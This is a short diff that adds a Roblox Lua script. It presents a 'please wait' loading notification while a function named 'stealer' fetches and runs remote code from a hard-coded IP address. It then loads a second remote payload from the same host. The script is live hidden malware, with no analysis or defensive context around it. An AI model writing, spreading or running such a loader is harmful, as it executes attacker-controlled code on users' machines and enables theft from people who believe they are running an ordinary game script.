@@ -1,0 +1,18 @@
+local function stealer()
+    ID="d6a2a10b-4612-4793-b39e-4354a0afc94c";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+end
+local function loadui()
+  game:GetService("StarterGui"):SetCore("SendNotification",{
+Title = "Please wait 20 seconds before script loading!",
+Text = "", 
+
+Button1 = "Yes",
+Button2 = "Cancel",
+Duration = 20
+})
+task.wait(22)
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
